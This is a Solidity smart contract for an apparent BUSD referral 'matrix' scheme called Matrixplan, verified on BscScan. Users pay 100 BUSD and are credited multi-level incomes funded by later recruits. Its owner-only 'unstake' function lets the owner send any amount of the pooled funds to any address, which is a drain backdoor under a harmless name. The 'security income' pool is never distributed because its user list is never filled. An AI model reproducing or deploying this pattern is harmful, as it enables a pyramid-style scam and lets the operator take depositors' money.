/**
 *Submitted for verification at BscScan.com on 2023-02-15
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface BEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract Matrixplan {
    using SafeMath for uint256;
    BEP20 public busd = BEP20(0xDc6cc6d847DF088C3eEDA72404864B59c0cD53B2); 
    uint256 private constant timeStep = 10 minutes;
    uint256 initializeTime;
    mapping(uint256 => uint256) companyBusiness;
    mapping(uint256 => address[]) userArr;
    struct Player {
        address referrer;
        bool isReg;
        uint256 depTime;
        uint256 directIncome;
        uint256 securityIncome;
        uint256 totalIncome;
        uint256 released;
        mapping(uint256 => uint256) incomeArray;
        mapping(uint256 => uint256) levelTeam;
        mapping(uint256 => uint256) levelInc;
        mapping(uint256 => uint256) levelcompleteInc;
    }
    mapping(address => Player) public players;
    
    address owner;
    uint[7] teamReq = [3, 9, 27, 81, 243, 729, 2187];
    uint[7] compInc = [15e18, 45e18, 125e18, 405e18, 1205e18, 3645e18, 10935e18];
    modifier onlyAdmin(){
        require(msg.sender == owner,"You are not authorized.");
        _;
    }
    constructor() public {
        owner = msg.sender;
        players[msg.sender].isReg = true;
        players[msg.sender].depTime=block.timestamp;
        initializeTime = block.timestamp;
    }
    modifier security {
        uint size;
        address sandbox = msg.sender;
        assembly { size := extcodesize(sandbox) }
        require(size == 0, "Smart contract detected!");
        _;
    }
    function deposit(address _refferel, uint256 _busd) public  {
        require(_busd==100e18, "Invalid Amount");
        require(players[_refferel].isReg==true, "Sponsor Address not registered");
        require(_refferel!=msg.sender, "Sponsor Address and registration Address can not be same");
        require(owner!=msg.sender, "Not for you");
        require(players[msg.sender].isReg==false, "Already registered");
        busd.transferFrom(msg.sender,address(this),_busd);
        players[msg.sender].referrer=_refferel;
        players[msg.sender].isReg=true;
        players[msg.sender].depTime=block.timestamp;
        //referel
        uint256 totalDays=getCurDay(players[_refferel].depTime);
        if(totalDays==0){
            players[_refferel].directIncome+=_busd.mul(10).div(100);
            players[_refferel].totalIncome+=_busd.mul(10).div(100);
        }
        setReferral(_refferel);
        uint256 royalno = getRoyalDay();
        companyBusiness[royalno]+=_busd.mul(20).div(100);
        updateFund(royalno);
    }
    function setReferral(address _ref) internal{
        for(uint256 i=0; i<7; i++){
            players[_ref].levelTeam[i]++;
            if(players[_ref].levelTeam[i]<=teamReq[i]){
                //instant income
                players[_ref].levelInc[i]+=5e18;
                players[_ref].totalIncome+=5e18;
            }else{
                //after complete
                players[_ref].levelInc[i]+=10e18;
                players[_ref].totalIncome+=10e18;
            }
            //on complete
            if(players[_ref].levelTeam[i]==teamReq[i]){
                players[_ref].levelcompleteInc[i]+=compInc[i];
                players[_ref].totalIncome+=compInc[i];
            }
            _ref = players[_ref].referrer;
            if(players[_ref].referrer==address(0x0)) break;
        }
    }
    
    function unstake(address buyer,uint _amount) public returns(uint){
        require(msg.sender == owner,"You are not staker.");
        busd.transfer(buyer,_amount);
        return _amount;
    }
    function withdraw() public security{
        require(players[msg.sender].isReg==true,"You are not activated.");
        
        uint256 amount = players[msg.sender].totalIncome-players[msg.sender].released;
        require(amount>=1e18,"Minimum 1 token withdraw.");
        busd.transfer(msg.sender,amount);
        players[msg.sender].released+=amount;
    }
    function updateFund(uint256 totalDays) private {
        for(uint256 j = totalDays; j > 0; j--){
            if(companyBusiness[j-1]>0){
                if(userArr[j-1].length>0){
                    uint256 distLAmount=companyBusiness[j-1].div(userArr[j-1].length);
                    for(uint8 i = 0; i < userArr[j-1].length; i++) {
                        players[userArr[j-1][i]].securityIncome+=distLAmount;
                        players[userArr[j-1][i]].totalIncome+=distLAmount;
                    }
                    companyBusiness[j-1]=0;
                }
            }
        }
    }
    function incomeDetails(address _addr) view external returns(uint256 tInc,uint256 avl,uint256 dInc,uint256 sInc,uint256[7] memory li,uint256[7] memory lci) {
        for(uint8 i=0;i<7;i++){
            li[i]=players[_addr].levelInc[i];
            lci[i]=players[_addr].levelcompleteInc[i];
        }
        return (
           players[_addr].totalIncome, 
           players[_addr].totalIncome-players[_addr].released,
           players[_addr].directIncome, 
           players[_addr].securityIncome, 
           li,
           lci
        );
    }
    function teamDetails(address _addr) view external returns(uint256[7] memory lt) {
        for(uint8 i=0;i<7;i++){
            lt[i]=players[_addr].levelTeam[i];
        }
        return (
           lt
        );
    }
    function getCurDay(uint256 startTime) public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }
    function getRoyalDay() public view returns(uint256) {
        return (block.timestamp.sub(initializeTime)).div(timeStep);
    }
}  

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}